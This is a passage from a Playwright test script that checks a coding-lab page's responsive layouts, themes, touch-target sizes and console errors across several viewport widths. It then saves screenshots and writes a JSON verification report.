      await context.close();
    }

    // ---------- Responsive layouts and themes ----------
    for (const width of [320, 375, 768, 1024, 1440]) for (const theme of ["dark", "light"]) {
      const { context, page, events } = await newPage(browser, { width, theme, hasTouch: width < 1024 });
      const tag = `${width}/${theme}`;
      await openChallenge(page);
      check(`${tag} no horizontal page overflow`, await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), await page.evaluate(() => [document.documentElement.scrollWidth, innerWidth]));
      check(`${tag} app and preview themes match`, await page.evaluate((theme) => document.documentElement.classList.contains(theme), theme) && (await previewFrame(page).locator("html").getAttribute("data-theme")) === theme);
      const tablist = await page.getByRole("tablist", { name: "Workspace views" }).count();
      check(`${tag} layout: ${width < 1024 ? "tabs" : "side-by-side panels"}`, width < 1024 ? tablist === 1 : tablist === 0 && await page.locator('[data-lab-panel="preview"]').isVisible() && await page.locator('[data-lab-panel="code"]').isVisible());
      check(`${tag} toolbar buttons meet 44px targets`, await page.locator("[data-lab-run], [data-lab-reset]").evaluateAll((elements) => elements.every((element) => element.getBoundingClientRect().height >= 44)));
      check(`${tag} no uncaught errors or hydration warnings`, events.pageErrors.length === 0 && !events.consoleErrors.some((entry) => /hydrat/i.test(entry.text)), [...events.pageErrors, ...events.consoleErrors.map((entry) => entry.text)]);
      await page.locator("[data-lab-workspace]").scrollIntoViewIfNeeded();
      await page.screenshot({ path: `docs/ed-018/screenshots/challenge-${width}-${theme}.png`, fullPage: width <= 375 ? false : true });
      if (width === 375 || width === 1440) {
        await page.goto(base + "/practice", { waitUntil: "networkidle" });
        check(`${tag} /practice has no horizontal overflow`, await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
        await page.screenshot({ path: `docs/ed-018/screenshots/practice-${width}-${theme}.png`, fullPage: true });
      }
      await context.close();
    }
  } catch (error) {
    report.errors.push(error.stack);
    console.error(error);
  } finally {
    await browser.close();
    server.close();
    report.finishedAt = new Date().toISOString();
    fs.writeFileSync("docs/ed-018/lab-verification.json", JSON.stringify(report, null, 2) + "\n");
    const failures = report.checks.filter((item) => !item.passed);
    console.log(JSON.stringify({ checks: report.checks.length, failed: failures.length, errors: report.errors.length }, null, 2));
    if (failures.length || report.errors.length) process.exitCode = 1;
  }
})();
